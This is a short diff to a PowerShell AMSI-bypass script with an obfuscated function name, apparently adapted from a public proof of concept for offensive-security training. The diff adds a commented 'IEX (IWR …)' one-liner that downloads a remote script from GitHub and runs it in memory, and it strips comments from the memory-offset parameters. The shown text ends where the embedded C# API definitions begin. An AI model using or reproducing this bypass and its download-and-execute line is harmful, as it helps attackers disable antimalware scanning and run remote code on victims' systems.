@@ -1,11 +1,12 @@
 function M@g1cByp@33 {
 # Original from https://github.com/V-i-x-x/AMSI-BYPASS/blob/main/POC.ps1
+# IEX (IWR -UseBasicParsing 'https://raw.githubusercontent.com/Mach-Five/OSEP/main/magic.ps1'); #M@g1cByp@33 -InitialStart #327680
 # Define named parameters
 param (
-    [int] $InitialStartAB = 131072 + 196608,  # Adding 131072 and 196608 to get 327680
-    [int] $NegativeOffsetAB = 131072 + 196608,  # Adding 131072 and 196608 to get 327680
+    [int] $InitialStartAB = 131072 + 196608, 
+    [int] $NegativeOffsetAB = 131072 + 196608,  
     [int] $MaxOffsetAB = 16770000 + 7216,
-    [int] $ReadBytesAB = 131072 + 196608  # Adding 131072 and 196608 to get 327680
+    [int] $ReadBytesAB = 131072 + 196608  
 )
 $APIs = @"
 using System;
